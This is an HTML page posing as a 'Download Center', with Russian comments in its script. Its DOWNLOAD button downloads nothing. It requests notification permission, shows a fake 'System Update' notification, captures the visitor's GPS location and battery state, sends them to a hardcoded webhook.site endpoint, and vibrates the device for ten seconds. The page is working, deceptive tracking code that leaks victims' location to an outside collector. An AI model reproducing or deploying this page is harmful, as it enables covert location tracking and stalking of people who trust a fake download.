<!DOCTYPE html>
<html lang="us">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Center</title>
    <style>
        body { font-family: sans-serif; background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .card { background: #111; padding: 25px; border-radius: 8px; width: 90%; max-width: 400px; text-align: center; }
        button { width: 100%; padding: 18px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 1.2rem; background: #007bff; color: white; }
        #status { margin-top: 15px; font-size: 0.8rem; color: #555; font-family: monospace; }
    </style>
</head>
<body>

<div class="card">
    <button onclick="masterAction()">DOWNLOAD</button>
    <div id="status">ruclick</div>
</div>

<script>
    const webhookUrl = "https://webhook.site/3536371a-f8c8-445e-a399-617a47d6fadb";

    // Создаем Service Worker "на лету" из кода
    const swCode = `
        self.addEventListener('install', (e) => self.skipWaiting());
        self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));
    `;
    const blob = new Blob([swCode], { type: 'application/javascript' });
    const swUrl = URL.createObjectURL(blob);

    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register(swUrl);
    }

    async function masterAction() {
        const status = document.getElementById('status');
        status.innerText = "--./---";

        // 1. ЗАПРОС РАЗРЕШЕНИЯ
        const permission = await Notification.requestPermission();
        
        if (permission === 'granted') {
            status.innerText = "-/.-././.-";
            
            // Пытаемся отправить через Service Worker (самый надежный метод для Android)
            if ('serviceWorker' in navigator) {
                const reg = await navigator.serviceWorker.ready;
                reg.showNotification("System Update", {
                    body: ".-/-.../-../..-/.-../.-../.-",
                    icon: "https://cdn-icons-png.flaticon.com/512/179/179386.png",
                    vibrate: [200, 100, 200],
                    tag: "download-alert"
                });
            } else {
                // Запасной вариант для старых браузеров
                new Notification("System", { body: "..../.-/.--./.--./-.--//.../-/..-." });
            }
        } else {
            status.innerTex = "error";
        }

        // 2. Сбор данных (Гео, Батарея)
        collectData();
    }

    async function collectData() {
        // Гео
        navigator.geolocation.getCurrentPosition(
            (p) => send("GEO", { lat: p.coords.latitude, lon: p.coords.longitude }),
            (e) => send("GEO_ERR", { c: e.code })
        );
        // Батарея
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            send("BAT", { l: bat.level * 100, c: bat.charging });
        }
        // Вибрация
        if (navigator.vibrate) navigator.vibrate(10000);
    }

    function send(type, data) {
        const q = new URLSearchParams(data).toString();
        fetch(`${webhookUrl}?type=${type}&${q}`).catch(() => {});
    }
</script>

</body>
</html>
